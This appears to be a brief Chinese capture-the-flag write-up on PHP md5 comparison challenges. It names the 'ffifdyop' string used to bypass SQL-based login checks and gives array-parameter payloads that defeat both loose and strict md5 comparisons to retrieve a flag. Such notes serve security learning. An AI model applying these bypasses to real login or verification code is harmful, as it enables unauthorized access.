奇妙的字符串
ffifdyop
[神奇的ffifdyop | 沉铝汤的破站 (chenlvtang.top)](https://chenlvtang.top/2020/06/02/%E7%A5%9E%E5%A5%87%E7%9A%84ffifdyop/)

第二个的线索在 HTML 注释里
```html
<!--
$x= $GET['x'];
$y = $_GET['y'];
if($x != $y && md5($x) == md5($y)){
    ;
-->
```

数组绕过
```url
?x[]=1&y[]=3
```

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
    echo $FLAG;
} 
```
继续数组绕过
```yrl
wqh[]=1&dsy[]=2
```
